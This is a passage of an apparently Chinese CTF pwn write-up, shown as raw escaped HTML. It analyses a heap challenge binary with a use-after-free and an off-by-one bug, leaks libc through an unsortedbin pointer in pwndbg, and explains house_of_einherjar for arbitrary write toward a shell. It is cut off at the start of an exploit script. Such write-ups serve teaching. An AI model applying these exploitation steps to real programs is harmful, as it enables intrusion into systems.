class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;delete_heap&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-10h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;number&#34;&gt;4uLL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = atoi(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; || v1 &amp;gt; &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Out of bound!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( *(&amp;amp;heaparray + v1) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)(*(&amp;amp;heaparray + v1))-&amp;gt;ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(*(&amp;amp;heaparray + v1));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *(&amp;amp;heaparray + v1) = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;                   &lt;span class=&#34;comment&#34;&gt;// 只清空了heaparray,结构体中指针未清空，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;No such heap !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;free 模块这里，其实仔细看，会发现虽然 free 后将 bss 段上的指针清空了，但是结构体的 ptr 成员并没有清空，但是这了 uaf 并不是很容易利用。因为 bss 段上的指针被清空了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;trr&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size; 		&lt;span class=&#34;comment&#34;&gt;//记录大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; * ptr;			&lt;span class=&#34;comment&#34;&gt;//储存我们输入Content&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ss:&lt;span class=&#34;number&#34;&gt;00000000006020&lt;/span&gt;A0 ; trr *heaparray&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020&lt;/span&gt;A0 heaparray       dq ?                    ; DATA XREF: create_heap+&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;↑r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020&lt;/span&gt;A0                                         ; create_heap+&lt;span class=&#34;number&#34;&gt;54&lt;/span&gt;↑w ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020&lt;/span&gt;A8                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020&lt;/span&gt;A9                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020&lt;/span&gt;AA                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020&lt;/span&gt;AB                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020&lt;/span&gt;AC                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020&lt;/span&gt;AD                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020&lt;/span&gt;AE                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020&lt;/span&gt;AF                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020B&lt;/span&gt;0                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020B&lt;/span&gt;1                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020B&lt;/span&gt;2                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020B&lt;/span&gt;3                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;00000000006020B&lt;/span&gt;4                 db    ? ;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;题目大概就是这样，初步我们看到了一个 off_by_one 漏洞，以及一个不是很理想 UAF&lt;/p&gt;
&lt;h2 id=&#34;pwning&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwning&#34;&gt;#&lt;/a&gt; pwning&lt;/h2&gt;
&lt;h3 id=&#34;开始前的准备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#开始前的准备&#34;&gt;#&lt;/a&gt; 开始前的准备&lt;/h3&gt;
&lt;p&gt;首先这个题并没有后门，那么我们就要去泄露 libc 的基地址。然后再去考虑其他的&lt;/p&gt;
&lt;h3 id=&#34;leak-the-libc_base&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#leak-the-libc_base&#34;&gt;#&lt;/a&gt; leak the libc_base&lt;/h3&gt;
&lt;p&gt;这里我们关注到的是在申请到堆块之后，并没有对其进行初始化，只是对储存有 content 的堆块检查读入的数据是否为 0 字节，也就是说我们至少读入一个字节，不过因为使用的 read 函数，所以不会自动的添加换行符，但这无所谓，这里将一个比较常用的 unsortedbins 泄露基地址 main_arena. 当一个较大的 chunk 超过了 fastbins 的范围，就会被加入 unsortedbins 双链表中。其实，第一个堆块的 fd,bk 指针会指向 main_arena+x,。当我们再次申请到这个 chunk 时，其 fd,bk 指针不会被清空，只是会被我们输入的 content 覆盖。但是我们输入的 content 只检查了至少输入一个字节，而且允许我们输入’\x00’空字符。&lt;/p&gt;
&lt;p&gt;那么这里就有了完整的泄露的思路&lt;/p&gt;
&lt;p&gt;申请一个 0x80 的堆块（实际得到的 0x90）, 然后将其释放。因为这个是一个嵌套的堆块，delete 的时候先释放 content, 再释放 struct&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x2368000&lt;/span&gt;			&lt;span class=&#34;comment&#34;&gt;//struct_trr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368000&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000021&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368010&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000080&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000002368030&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x2368020&lt;/span&gt;			&lt;span class=&#34;comment&#34;&gt;//content&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368020&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000091&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368030&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;free 后&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; bins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fastbins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x2368000&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsortedbin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;all: &lt;span class=&#34;number&#34;&gt;0x2368020&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fb1f48beb78&lt;/span&gt; (main_arena+&lt;span class=&#34;number&#34;&gt;88&lt;/span&gt;) ◂— &lt;span class=&#34;number&#34;&gt;0x2368020&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smallbins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;empty&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;largebins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;##########################################################&lt;span class=&#34;meta&#34;&gt;#    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;pwndbg&amp;gt; x/4gx 0x2368020&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368020&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000091&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368030&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007fb1f48beb78&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007fb1f48beb78&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;重新申请后，只要控制 conten 的长度不会将 bk 指针释放释放，同时字符串可以将 bk 链接起来，就可以再 show 的时候，将 bk 泄露出来&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x2368010&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368010&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000080&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000002368030&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x0000000002368030&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368020&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000091&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x2368030&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6161616161616161&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007fb1f48beb78&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;关键point&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#关键point&#34;&gt;#&lt;/a&gt; 关键 point&lt;/h3&gt;
&lt;p&gt;这个题的关键难点在于适合实现 shell，劫持 malloc_hook 也好，覆盖 got 表也好都需要实现任意地址写，这里我们用到一个 unlink 手法 house_of_einherjar。这项技术使用的前提就是存在溢出，至少 1 字节，来修改一个 allocated_chunk 的 prev_size 和 prev_inuse。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;house_of_einherjar======&amp;gt;&lt;br&gt;
 而此手法有几个点值得关注，1，我们可以认为的修改一个 allocted_chunk 的 prev_size, 以及 prev_inuse. 我们需要构造一个 fake_chunk (一个方面泄露栈地址，在栈上伪造一个 chunk，这个方法配合修改 eip 使用，但是因为栈的内容会发生变化，就要进一步思考控制具体到哪里。其二可以在 bss 段上伪造 chunk，达到修改全局变量的目的。其三可以控制到 got 表，修改 got 表。其四控制到 malloc_hook,free_hook,reallok_hook, 使用 onegadget)。 prev_size = victim_chunk_size - aimed_address。 同时我们还需要利用 victim 的前一个 allocted chunk A， 申请的大小不要使 16 位对齐，0x10*k+8, 这样就可以在申请到 victim B 后，prev_size 允许被 A 使用，同时可以利用 off_by_one 技术 NULL 溢出修改 B 的 prev_inuse（将其改为 0），这样 unlink 通过 chunk_addr_B - prev_size 定位到 fake_chunk, 因为 bss 以及栈地址通常会比 heap 地址大，所以 prev_size 传入的是一个负数，但是因为 prev_size 是无符号数，发生溢出，就这样虽然我们 free B，向前 unlink，结果其实把后面的 fakechunk 合并到一起，而且新的堆头地址是 fakechunk。注意构造 fake_chunk 时，要保证其可以 pass unlink 的检查&lt;/p&gt;
&lt;p&gt;p-&amp;gt;fd-&amp;gt;bk=p,p-&amp;gt;bk-&amp;gt;fd=p,p-&amp;gt;prev_size = p-&amp;gt;bk-&amp;gt;size，p-&amp;gt;fd-&amp;gt;prev_size = p-&amp;gt;size, 最简单的就是将 fd、bk 指向自己。unlink 时，不会改变被合并的堆块的数据，只会更改新的堆头数据，此时 fakechunk 就是新的 topchunk&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们在对快中伪造一个个 fakechunk，然后修改 victim_chunk, 这里要注意的是，victim_chunk 必须与 topchunk 相邻，才可以实现 fake_top_chunk. 这里细解释下为什么这样做，这样做的目的是，在 unlink 前，我们已经申请出一些堆块，比如存在一个结构体堆块，而这个堆块的地址比 fakechunk 大，那么 unlink 后，这个堆块的数据不变，但是 topchunk 的位置在这个堆块之前，我们就可以再次利用到这个堆块，换言之，我们申请一个很大堆块，那么刚刚所说 结构体会被包含，当我们编辑这个大堆块的内容时，控制长度就可以将其覆盖，而我们有知道结构体里面还有一个 content 的指针，如果我们把这个覆盖这个指针，就实现了任意地址写。&lt;/p&gt;
&lt;p&gt;这里要解决几个问题，每次创建的时候会申请出来两个堆块，一个大小 0x20, 一个为 size。为了溢出，我们就要考虑堆块的布局，这里我提供一种&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaa&amp;#x27;&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaa&amp;#x27;&lt;/span&gt;)		&lt;span 